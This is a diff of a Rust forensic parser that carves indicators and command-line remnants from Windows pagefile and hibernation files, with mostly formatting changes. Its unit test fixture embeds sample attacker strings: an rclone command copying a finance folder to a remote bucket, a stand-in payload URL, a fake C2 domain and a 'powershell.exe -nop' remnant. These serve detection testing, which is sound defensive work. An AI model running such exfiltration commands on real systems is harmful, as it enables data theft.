@@ -25,8 +25,8 @@
 //! its size and modified time.
 
 use fx_core::{
-    ArtefactKind, Event, EventSink, IdentifiedArtefact, ParseError, ParseOutcome, Parser, Principal,
-    ProcessInfo, Provenance, RecordWarning, Target, TimestampKind,
+    ArtefactKind, Event, EventSink, IdentifiedArtefact, ParseError, ParseOutcome, Parser,
+    Principal, ProcessInfo, Provenance, RecordWarning, Target, TimestampKind,
 };
 use regex::Regex;
 use serde_json::json;
@@ -76,11 +76,71 @@ fn res() -> &'static Res {
 fn tld_ok(t: &str) -> bool {
     matches!(
         t.to_ascii_lowercase().as_str(),
-        "com" | "net" | "org" | "io" | "info" | "biz" | "co" | "us" | "uk" | "de" | "fr" | "nl" | "ru" | "su" | "cn"
-            | "hk" | "tw" | "jp" | "kr" | "in" | "br" | "ua" | "by" | "kz" | "ir" | "tk" | "ml" | "ga" | "cf" | "gq"
-            | "xyz" | "top" | "online" | "site" | "club" | "shop" | "store" | "live" | "app" | "dev" | "cloud"
-            | "me" | "cc" | "tv" | "ws" | "pw" | "to" | "is" | "ch" | "eu" | "ca" | "au" | "onion" | "link"
-            | "icu" | "buzz" | "work" | "space" | "fun" | "website" | "tech" | "pro" | "zip" | "mov" | "lol"
+        "com"
+            | "net"
+            | "org"
+            | "io"
+            | "info"
+            | "biz"
+            | "co"
+            | "us"
+            | "uk"
+            | "de"
+            | "fr"
+            | "nl"
+            | "ru"
+            | "su"
+            | "cn"
+            | "hk"
+            | "tw"
+            | "jp"
+            | "kr"
+            | "in"
+            | "br"
+            | "ua"
+            | "by"
+            | "kz"
+            | "ir"
+            | "tk"
+            | "ml"
+            | "ga"
+            | "cf"
+            | "gq"
+            | "xyz"
+            | "top"
+            | "online"
+            | "site"
+            | "club"
+            | "shop"
+            | "store"
+            | "live"
+            | "app"
+            | "dev"
+            | "cloud"
+            | "me"
+            | "cc"
+            | "tv"
+            | "ws"
+            | "pw"
+            | "to"
+            | "is"
+            | "ch"
+            | "eu"
+            | "ca"
+            | "au"
+            | "onion"
+            | "link"
+            | "icu"
+            | "buzz"
+            | "work"
+            | "space"
+            | "fun"
+            | "website"
+            | "tech"
+            | "pro"
+            | "zip"
+            | "mov"
+            | "lol"
     )
 }
 
@@ -112,7 +172,10 @@ impl Carved {
         let r = res();
         if s.contains("://") {
             for m in r.url.find_iter(s) {
-                let u = m.as_str().trim_end_matches(|c: char| matches!(c, '.' | ',' | ')' | '\'' | '"')).to_string();
+                let u = m
+                    .as_str()
+                    .trim_end_matches(['.', ',', ')', '\'', '"'])
+                    .to_string();
                 if u.len() < 12 || self.seen_url.contains_key(&u.to_ascii_lowercase()) {
                     continue;
                 }
@@ -145,7 +208,12 @@ impl Carved {
                 // Skip version strings (10.0.19041.1) and the obvious non-addresses.
                 let after = s[m.end()..].chars().next();
                 let before = s[..m.start()].chars().last();
-                if matches!(after, Some('.')) || matches!(before, Some('.')) || v.starts_with("0.") || v == "255.255.255.255" || v.starts_with("127.") {
+                if matches!(after, Some('.'))
+                    || matches!(before, Some('.'))
+                    || v.starts_with("0.")
+                    || v == "255.255.255.255"
+                    || v.starts_with("127.")
+                {
                     continue;
                 }
                 self.token("ipv4", v.to_string(), off + m.start() as u64);
@@ -162,7 +230,11 @@ impl Carved {
                 self.token("domain", v, off + whole.start() as u64);
             }
             for m in r.fname.find_iter(s) {
-                self.token("file", m.as_str().to_ascii_lowercase(), off + m.start() as u64);
+                self.token(
+                    "file",
+                    m.as_str().to_ascii_lowercase(),
+                    off + m.start() as u64,
+                );
             }
         }
         if s.len() >= 32 {
@@ -179,6 +251,7 @@ impl Carved {
 }
 
 /// Streaming carver for printable ASCII and UTF-16LE runs.
+#[derive(Default)]
 pub struct Carver {
     pub out: Carved,
     ascii: Vec<u8>,
@@ -191,12 +264,6 @@ pub struct Carver {
 
 fn printable(b: u8) -> bool {
     (0x20..0x7f).contains(&b) || b == b'\t'
-}
-
-impl Default for Carver {
-    fn default() -> Self {
-        Self { out: Carved::default(), ascii: Vec::new(), ascii_start: 0, wide: [Vec::new(), Vec::new()], wide_start: [0, 0], pos: 0, last_byte: 0 }
-    }
 }
 
 impl Carver {
@@ -262,23 +329,35 @@ impl Carver {
 }
 
 fn basename(p: &str) -> &str {
-    p.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(p)
+    p.rsplit(['\\', '/']).next().unwrap_or(p)
 }
 
-fn file_mtime(path: &std::path::Path) -> OffsetDateTime {
-    std::fs::metadata(path)
-        .and_then(|m| m.modified())
-        .map(OffsetDateTime::from)
-        .unwrap_or(OffsetDateTime::UNIX_EPOCH)
+fn file_mtime(path: &std::path::Path) -> (OffsetDateTime, TimestampKind) {
+    fx_core::time_or_undated(
+        std::fs::metadata(path)
+            .and_then(|m| m.modified())
+            .map(OffsetDateTime::from)
+            .ok(),
+        TimestampKind::Recorded,
+    )
 }
 
 /// What a hiberfil header says about the image.
 pub fn hiberfil_state(head: &[u8]) -> (&'static str, &'static str) {
     match head.get(0..4) {
-        Some(b"hibr") | Some(b"HIBR") => ("hibr", "hibernation image present (written at hibernate / Fast Startup shutdown)"),
-        Some(b"wake") | Some(b"WAKE") => ("wake", "header marked after resume; memory pages may still be present"),
+        Some(b"hibr") | Some(b"HIBR") => (
+            "hibr",
+            "hibernation image present (written at hibernate / Fast Startup shutdown)",
+        ),
+        Some(b"wake") | Some(b"WAKE") => (
+            "wake",
+            "header marked after resume; memory pages may still be present",
+        ),
         Some(b"RSTR") | Some(b"rstr") => ("rstr", "resume in progress when collected"),
-        Some(b"\0\0\0\0") => ("zeroed", "header zeroed after resume; memory pages may still be present"),
+        Some(b"\0\0\0\0") => (
+            "zeroed",
+            "header zeroed after resume; memory pages may still be present",
+        ),
         _ => ("unknown", "unrecognised header"),
     }
 }
@@ -292,11 +371,20 @@ impl Parser for MemoryFilesParser {
         &[ArtefactKind::Pagefile, ArtefactKind::Hiberfil]
     }
 
-    fn parse(&self, artefact: &IdentifiedArtefact, sink: &mut dyn EventSink) -> Result<ParseOutcome, ParseError> {
-        let io = |e: std::io::Error| ParseError::Io { path: artefact.path.display().to_string(), source: e };
+    fn parse(
+        &self,
+        artefact: &IdentifiedArtefact,
+        sink: &mut dyn EventSink,
+    ) -> Result<ParseOutcome, ParseError> {
+        let io = |e: std::io::Error| ParseError::Io {
+            path: artefact.path.display().to_string(),
+            source: e,
+        };
         let mut outcome = ParseOutcome::default();
-        let mtime = file_mtime(&artefact.path);
-        let size = std::fs::metadata(&artefact.path).map(|m| m.len()).unwrap_or(0);
+        let (mtime, mkind) = file_mtime(&artefact.path);
+        let size = std::fs::metadata(&artefact.path)
+            .map(|m| m.len())
+            .unwrap_or(0);
         let fname = basename(&artefact.source_path).to_string();
         let prov = |r: String| Provenance {
             evidence_id: artefact.evidence_id,
@@ -308,7 +396,7 @@ impl Parser for MemoryFilesParser {
         let base = |action: &str, message: String, raw: serde_json::Value, r: String| Event {
             id: Uuid::new_v4(),
             timestamp: mtime,
-            timestamp_kind: TimestampKind::Recorded,
+            timestamp_kind: mkind,
             artefact: artefact.artefact,
             action: action.into(),
             host: None,
@@ -323,7 +411,9 @@ impl Parser for MemoryFilesParser {
 
         if artefact.artefact == ArtefactKind::Hiberfil {
             let mut head = [0u8; 4096];
-            let n = std::fs::File::open(&artefact.path).and_then(|mut f| f.read(&mut head)).map_err(io)?;
+            let n = std::fs::File::open(&artefact.path)
+                .and_then(|mut f| f.read(&mut head))
+                .map_err(io)?;
             let (sig, meaning) = hiberfil_state(&head[..n]);
             outcome.records_read = 1;
             sink.emit(base(
@@ -357,22 +447,35 @@ impl Parser for MemoryFilesParser {
         }
         let c = carver.finish();
         if cancelled {
-            outcome.warnings.push(RecordWarning { source_ref: None, message: "carving stopped early: ingest cancelled".into() });
+            outcome.warnings.push(RecordWarning {
+                source_ref: None,
+                message: "carving stopped early: ingest cancelled".into(),
+            });
         }
         for k in &c.truncated {
-            outcome.warnings.push(RecordWarning { source_ref: None, message: format!("{k}: cap reached, further distinct values not kept") });
+            outcome.warnings.push(RecordWarning {
+                source_ref: None,
+                message: format!("{k}: cap reached, further distinct values not kept"),
+            });
         }
         let note = "memory remnant: no timestamp of its own (dated to the file's modified time); may come from paged-out antivirus signatures or documents — corroborate with on-disk evidence";
 
         for (cmd, off) in &c.cmds {
-            let name = cmd.split_whitespace().next().map(|s| basename(s.trim_matches('"')).to_string());
+            let name = cmd
+                .split_whitespace()
+                .next()
+                .map(|s| basename(s.trim_matches('"')).to_string());
             let mut ev = base(
                 "memory.cmdline_remnant",
                 format!("Command line in {fname}: {cmd}"),
                 json!({ "command_line": cmd, "offset": format!("0x{off:x}"), "note": note }),
                 format!("offset 0x{off:x}"),
             );
-            ev.process = Some(ProcessInfo { command_line: Some(cmd.clone()), name, ..Default::default() });
+            ev.process = Some(ProcessInfo {
+                command_line: Some(cmd.clone()),
+                name,
+                ..Default::default()
+            });
             sink.emit(ev);
             outcome.events_emitted += 1;
         }
@@ -383,7 +486,12 @@ impl Parser for MemoryFilesParser {
                 json!({ "url": url, "offset": format!("0x{off:x}"), "note": note }),
                 format!("offset 0x{off:x}"),
             );
-            ev.target = Some(Target { path: Some(url.clone()), value_name: None, hash_sha1: None, size: None });
+            ev.target = Some(Target {
+                path: Some(url.clone()),
+                value_name: None,
+                hash_sha1: None,
+                size: None,
+            });
             sink.emit(ev);
             outcome.events_emitted += 1;
         }
@@ -394,12 +502,17 @@ impl Parser for MemoryFilesParser {
             _ => "executable / script names",
         };
         for kind in ["domain", "ipv4", "hash", "file"] {
-            let Some(m) = c.tokens.get(kind) else { continue };
+            let Some(m) = c.tokens.get(kind) else {
+                continue;
+            };
             let mut v: Vec<(&String, &(u64, u64))> = m.iter().collect();
             v.sort_by(|a, b| b.1 .0.cmp(&a.1 .0).then(a.0.cmp(b.0)));
             let parts = v.len().div_ceil(BUNDLE);
             for (pi, chunk) in v.chunks(BUNDLE).enumerate() {
-                let values: Vec<String> = chunk.iter().map(|(val, (n, off))| format!("{val} ×{n} @0x{off:x}")).collect();
+                let values: Vec<String> = chunk
+                    .iter()
+                    .map(|(val, (n, off))| format!("{val} ×{n} @0x{off:x}"))
+                    .collect();
                 sink.emit(base(
                     "memory.indicators",
                     format!(
@@ -434,8 +547,12 @@ mod tests {
         data.push(0x99); // odd padding so the UTF-16 run sits at an odd offset
         data.extend(utf16("rclone.exe copy C:\\Finance remote:bucket"));
         data.extend_from_slice(&[0, 0, 0xFF]);
-        data.extend_from_slice(b"\x00see https://evil-example.top/payload.bin and 185.220.101.4 or 10.0.19041.1 \x00");
-        data.extend(utf16("hash 44d88612fea8a8f36de82e1278abb02f in invoice.exe at c2.badcorp.xyz"));
+        data.extend_from_slice(
+            b"\x00see https://evil-example.top/payload.bin and 185.220.101.4 or 10.0.19041.1 \x00",
+        );
+        data.extend(utf16(
+            "hash 44d88612fea8a8f36de82e1278abb02f in invoice.exe at c2.badcorp.xyz",
+        ));
         data.extend_from_slice(&[0xFF; 9]);
         let mut c = Carver::default();
         for chunk in data.chunks(7) {
@@ -443,10 +560,16 @@ mod tests {
         }
         let out = c.finish();
         let cmds: Vec<&str> = out.cmds.iter().map(|x| x.0.as_str()).collect();
-        assert!(cmds.iter().any(|c| c.starts_with("powershell.exe -nop")), "{cmds:?}");
-        assert!(cmds.iter().any(|c| c.starts_with("rclone.exe copy")), "{cmds:?}");
+        assert!(
+            cmds.iter().any(|c| c.starts_with("powershell.exe -nop")),
+            "{cmds:?}"
+        );
+        assert!(
+            cmds.iter().any(|c| c.starts_with("rclone.exe copy")),
+            "{cmds:?}"
+        );
         assert_eq!(out.urls.len(), 1);
-        let t = |k: &str, v: &str| out.tokens.get(k).map_or(false, |m| m.contains_key(v));
+        let t = |k: &str, v: &str| out.tokens.get(k).is_some_and(|m| m.contains_key(v));
         assert!(t("ipv4", "185.220.101.4"));
         assert!(!t("ipv4", "10.0.19041.1") && !t("ipv4", "0.19041.1"));
         assert!(t("hash", "44d88612fea8a8f36de82e1278abb02f"));
